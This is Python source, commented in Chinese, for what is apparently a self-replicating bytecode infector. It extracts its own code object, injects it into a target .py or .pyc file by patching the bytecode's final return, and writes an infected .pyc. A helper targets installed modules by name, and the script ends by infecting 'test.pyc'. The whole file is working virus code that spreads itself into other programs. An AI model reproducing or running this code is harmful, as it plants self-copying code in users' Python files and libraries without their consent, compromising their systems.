from pycodeobject.code_ import Code
from inspect import iscode
import marshal,os,sys
try:
    from importlib._bootstrap_external import MAGIC_NUMBER
except ImportError:
    from importlib._bootstrap import MAGIC_NUMBER

MARK=b"#####MyPython####"

def extract_file(filename):
    # 将py,pyc文件还原为Code对象
    code=open(filename,'rb').read()
    if filename.endswith('.pyc'):
        code=code[16:] if code[16]==227 else code[12:]
        return Code(marshal.loads(code))
    else: # .py文件
        return Code(compile(code,__file__,'exec'))

def to_b(int):
    return int.to_bytes(1,'big')

def find_mark(code):
    # 判断MARK (标记)是否已在code中
    return MARK in marshal.dumps(code._code)

def insert_to_code(target,code_):
    # 将code_插入target对象 (相当于捆绑code_和target) !!!

    # 定义函数部分的反编译
    #          0 LOAD_CONST               0 (<code object f at ...>)
    #          2 LOAD_CONST               1 ('f')
    #          4 MAKE_FUNCTION            0
    #          6 STORE_NAME               0 (f)

  #2           8 LOAD_NAME                0 (f)
  #           10 CALL_FUNCTION            0
  #           12 POP_TOP
  #           14 LOAD_CONST               2 (None)
  #           16 RETURN_VALUE
    co = b'''d%s\
d%s\
\x84\x00\
Z%s\
e%s\
\x83\x00\
\x01\x00\
d%s\
S\x00'''
    
    fname='f'
    # !!!
    target.co_consts+=(code_._code,fname)
    co_id,n_id=len(target.co_consts)-2,len(target.co_consts)-1
    target.co_names+=(fname,)
    f_id=len(target.co_names)-1

    # 找出返回None的bytecode
    none_id=target.co_consts.index(None)
    # 组装bytecode co
    co = co % (to_b(co_id),to_b(n_id),
               to_b(f_id),to_b(f_id),to_b(none_id))

    # 去除原先返回None的bytecode
    co_ret_none=b'd%sS\x00' % to_b(none_id)
    # 插入到target对象
    target.co_code=target.co_code.replace(co_ret_none,b'') + co # !!!
    return target

def dump_to_pyc(pycfilename,code):
    # 制作pyc文件
    with open(pycfilename,'wb') as f:
        # 写入 pyc 文件头
        if sys.winver >= '3.7':
            pycheader=MAGIC_NUMBER+b'\x00'*12
        else:
            pycheader=MAGIC_NUMBER+b'\x00'*8
        f.write(pycheader)
        # 写入bytecode
        marshal.dump(code._code,f)

def extract_self(co=None):
    if not co:co=extract_file(__file__)
    for value in co.co_consts:
        if isinstance(value,bytes) and MARK in value:
            return co
        elif iscode(value):
            value=Code(value)
            return extract_self(value)

def spread(target):
    # 将自身 (本文件) 插入文件target !!!, 实现程序自我复制
    self=extract_self()
    co=extract_file(target)
    if not find_mark(co):
        # print('Inserting')
        co=insert_to_code(co,self)
        dump_to_pyc(os.path.splitext(target)[0] + '.pyc',co)
    # print(co._code.co_code)
    return co

def spread_to_mod(modname):
    # 插入到某个模块
    file=__import__(modname).__file__
    spread(file)

target='test.pyc'
co=spread(target)
# print('hello world') # 用于测试
